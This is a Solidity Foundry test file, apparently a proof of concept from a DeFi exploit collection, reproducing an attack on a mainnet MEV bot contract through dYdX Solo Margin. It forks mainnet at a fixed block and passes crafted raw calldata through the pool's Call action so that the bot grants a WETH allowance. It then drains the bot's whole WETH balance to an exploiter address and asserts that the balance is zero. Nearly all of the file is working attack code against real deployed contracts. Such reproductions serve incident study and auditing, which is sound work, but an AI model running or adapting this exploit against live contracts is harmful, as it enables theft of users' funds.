// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/**
 * POC Build by
 * - https://twitter.com/kayaba2002
 * - https://twitter.com/eugenioclrc
 */

interface Structs {
    struct Val {
        uint256 value;
    }

    enum ActionType {
        Deposit, // supply tokens
        Withdraw, // borrow tokens
        Transfer, // transfer balance between accounts
        Buy, // buy an amount of some token (externally)
        Sell, // sell an amount of some token (externally)
        Trade, // trade tokens against another account
        Liquidate, // liquidate an undercollateralized or expiring account
        Vaporize, // use excess tokens to zero-out a completely negative account
        Call // send arbitrary data to an address
    }

    enum AssetDenomination {
        Wei // the amount is denominated in wei
    }

    enum AssetReference {
        Delta // the amount is given as a delta from the current value
    }

    struct AssetAmount {
        bool sign; // true if positive
        AssetDenomination denomination;
        AssetReference ref;
        uint256 value;
    }

    struct ActionArgs {
        ActionType actionType;
        uint256 accountId;
        AssetAmount amount;
        uint256 primaryMarketId;
        uint256 secondaryMarketId;
        address otherAddress;
        uint256 otherAccountId;
        bytes data;
    }

    struct Info {
        address owner; // The address that owns the account
        uint256 number; // A nonce that allows a single address to control many accounts
    }

    struct Wei {
        bool sign; // true if positive
        uint256 value;
    }
}

library Account {
    struct Info {
        address owner;
        uint256 number;
    }
}

interface DyDxPool is Structs {
    function getAccountWei(Info memory account, uint256 marketId) external view returns (Wei memory);
    function operate(Info[] memory, ActionArgs[] memory) external;
}

contract ContractTest is Test {
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    DyDxPool pool = DyDxPool(0x1E0447b19BB6EcFdAe1e4AE1694b0C3659614e4e); //this is dydx solo margin sc

    address exploiter;
    address MEVBOT = 0xbaDc0dEfAfCF6d4239BDF0b66da4D7Bd36fCF05A;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        exploiter = cheats.addr(31_337);

        // fork mainnet at block 15625424
        cheats.createSelectFork("mainnet", 15_625_424);
    }

    function testExploit() public {
        emit log_named_decimal_uint("MEV Bot balance before exploit:", weth.balanceOf(MEVBOT), 18);

        Structs.Info[] memory _infos = new Structs.Info[](1);
        _infos[0] = Structs.Info({owner: address(this), number: 1});

        Structs.ActionArgs[] memory _args = new Structs.ActionArgs[](1);
        _args[0] = Structs.ActionArgs(
            // ActionType actionType;
            Structs.ActionType.Call,
            // uint256 accountId;
            0,
            // AssetAmount amount;
            Structs.AssetAmount(
                // bool sign; // true if positive
                false,
                // AssetDenomination denomination;
                Structs.AssetDenomination.Wei,
                // AssetReference ref;
                Structs.AssetReference.Delta,
                // uint256 value;
                0
            ),
            // uint256 primaryMarketId;
            0,
            // uint256 secondaryMarketId;
            0,
            // address otherAddress;
            MEVBOT,
            // uint256 otherAccountId;
            0,
            // bytes data;
            //abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)
            // no idea of what of how this byte calldata works
            bytes.concat(
                abi.encode(
                    0x0000000000000000000000000000000000000000000000000000000000000003,
                    address(pool),
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x00000000000000000000000000000000000000000000000000000000000000e0,
                    0x000000000000000000000000000000000000000000000beff1ceef246ef7bd1f,
                    0x0000000000000000000000000000000000000000000000000000000000000001,
                    0x0000000000000000000000000000000000000000000000000000000000000020,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000000,
                    address(this),
                    address(weth)
                ),
                abi.encode(
                    0x00000000000000000000000000000000000000000000000000000000000000a0,
                    address(this),
                    0x0000000000000000000000000000000000000000000000000000000000000040,
                    0x00000000000000000000000000000000000000000000000000000000000000a0,
                    0x0000000000000000000000000000000000000000000000000000000000000004,
                    0x4798ce5b00000000000000000000000000000000000000000000000000000000,
                    0x0000000000000000000000000000000000000000000000000000000000000002,
                    0x0000000000000000000000000000000000000000000000000000000000000004,
                    0x0000000000000000000000000000000000000000000000000000000000000001,
                    0x0000000000000000000000000000000000000000000000000000000000000001,
                    0x0000000000000000000000000000000000000000000000000000000000000002,
                    0x0000000000000000000000000000000000000000000000000000000000000002
                )
            )
        );

        pool.operate(_infos, _args);

        emit log_named_decimal_uint("Contract BADCODE WETH Allowance", weth.allowance(MEVBOT, address(this)), 18);

        weth.transferFrom(MEVBOT, exploiter, weth.balanceOf(MEVBOT));

        emit log_named_decimal_uint("MEV Bot WETH balance After exploit:", weth.balanceOf(MEVBOT), 18);

        emit log_named_decimal_uint("Exploiter WETH balance After exploit:", weth.balanceOf(exploiter), 18);

        assertEq(weth.balanceOf(MEVBOT), 0);
    }

    /**
     * For some reason it calls a 00000000 function on our contract.
     * By changing values on the encode args we can proabaly change the func signature
     * Meanwhile we can add a fallback and run our logic in there.
     *
     * ContractTest::00000000(000000000000000000000000000000000000000000000000000000044798ce5b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000beff1ceef246ef7bd1f00000000000000000000000000000000000000000000000000000001)
     */
    fallback() external {}
}
